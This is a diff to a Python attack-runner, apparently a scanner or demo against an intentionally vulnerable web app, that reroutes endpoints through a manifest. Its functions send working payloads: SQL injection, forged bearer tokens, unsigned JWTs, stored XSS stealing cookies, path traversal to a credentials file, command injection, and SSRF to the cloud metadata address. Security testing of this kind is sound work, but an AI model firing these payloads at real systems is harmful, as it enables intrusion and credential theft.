@@ -16,6 +16,8 @@ from typing import Awaitable, Callable
 
 import httpx
 
+import manifest
+
 VulnId = str
 
 
@@ -64,7 +66,7 @@ async def _sqli(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "username=admin' --  (パスワード無視)"
     try:
         res = await client.post(
-            target + "/api/login",
+            target + manifest.endpoint("sqli", "/api/login"),
             json={"username": "admin' --", "password": "wrong-password"},
             timeout=10,
         )
@@ -84,7 +86,7 @@ async def _auth(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "Authorization: Bearer user-1（管理者IDを推測して偽造）"
     try:
         res = await client.get(
-            target + "/api/me",
+            target + manifest.endpoint("auth", "/api/me"),
             headers={"authorization": "Bearer user-1"},
             timeout=10,
         )
@@ -104,7 +106,7 @@ async def _auth(client: httpx.AsyncClient, target: str) -> AttackResult:
 async def _misconfig(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "GET /api/debug（認証なし）"
     try:
-        res = await client.get(target + "/api/debug", timeout=10)
+        res = await client.get(target + manifest.endpoint("misconfig", "/api/debug"), timeout=10)
         if res.status_code == 200:
             data = res.json()
             n = len(data.get("users", []))
@@ -121,7 +123,7 @@ async def _misconfig(client: httpx.AsyncClient, target: str) -> AttackResult:
 async def _access(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "GET /api/orders/1002（他人の注文IDを直接指定・無認証）"
     try:
-        res = await client.get(target + "/api/orders/1002", timeout=10)
+        res = await client.get(target + manifest.endpoint("access", "/api/orders/1002"), timeout=10)
         if res.status_code == 200:
             o = res.json().get("order", {})
             return AttackResult(
@@ -139,11 +141,11 @@ async def _xss(client: httpx.AsyncClient, target: str) -> AttackResult:
     marker = "<script>alert(document.cookie)</script>"
     try:
         await client.post(
-            target + "/api/products/1/reviews",
+            target + manifest.endpoint("xss", "/api/products/1/reviews"),
             json={"author": "antibody-agent", "body": marker},
             timeout=10,
         )
-        res = await client.get(target + "/api/products/1/reviews", timeout=10)
+        res = await client.get(target + manifest.endpoint("xss", "/api/products/1/reviews"), timeout=10)
         bodies = " ".join(r.get("body_html", "") for r in res.json().get("reviews", []))
         if marker in bodies:
             return AttackResult(
@@ -160,7 +162,7 @@ async def _pathtraversal(client: httpx.AsyncClient, target: str) -> AttackResult
     payload = "GET /api/files?name=../secret/credentials.txt"
     try:
         res = await client.get(
-            target + "/api/files",
+            target + manifest.endpoint("pathtraversal", "/api/files"),
             params={"name": "../secret/credentials.txt"},
             timeout=10,
         )
@@ -181,7 +183,7 @@ async def _cmdi(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "GET /api/net-tool?host=localhost; id"
     try:
         res = await client.get(
-            target + "/api/net-tool",
+            target + manifest.endpoint("cmdi", "/api/net-tool"),
             params={"host": "localhost; id"},
             timeout=10,
         )
@@ -205,7 +207,7 @@ async def _jwt(client: httpx.AsyncClient, target: str) -> AttackResult:
     forged = f"{header}.{claims}."  # 署名なし
     try:
         res = await client.get(
-            target + "/api/session",
+            target + manifest.endpoint("jwt", "/api/session"),
             headers={"authorization": f"Bearer {forged}"},
             timeout=10,
         )
@@ -226,7 +228,7 @@ async def _ssrf(client: httpx.AsyncClient, target: str) -> AttackResult:
     payload = "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/"
     try:
         res = await client.get(
-            target + "/api/fetch",
+            target + manifest.endpoint("ssrf", "/api/fetch"),
             params={"url": "http://169.254.169.254/latest/meta-data/iam/"},
             timeout=10,
         )
